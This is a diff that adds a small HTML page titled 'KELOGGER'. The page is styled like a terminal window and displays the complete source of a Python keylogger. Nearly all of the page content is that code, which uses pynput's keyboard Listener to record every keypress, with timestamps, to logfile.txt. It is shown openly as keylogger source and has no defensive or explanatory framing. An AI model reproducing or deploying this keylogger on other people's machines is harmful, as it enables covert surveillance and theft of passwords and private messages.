@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>KELOGGER</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+
+<div class=Menu>
+  <div class="Button Close"></div>
+  <div class="Button Minimize"></div>
+  <div class="Button Zoom"></div>
+</div>
+<div class="Screen">
+
+  <div class="main">Source code</div>
+
+  <p class="code">from pynput.keyboard import Key, Listener</p>
+    <p class="code">import logging</p>
+      <p class="code">log_dir=""</p>
+        <p class="code">logging.basicConfig(filename=(log_dir+"logfile.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")</p>
+          <p class="code">def on_press (key):</p>
+            <p class="code">logging.info(str(key))</p>
+              <p class="code">with Listener (on_press=on_press)as listener:</p>
+                <p class="code"> listener.join()<span class="cursor">_</span></p>
+
+</div>
+
+
+</body>
+</html>
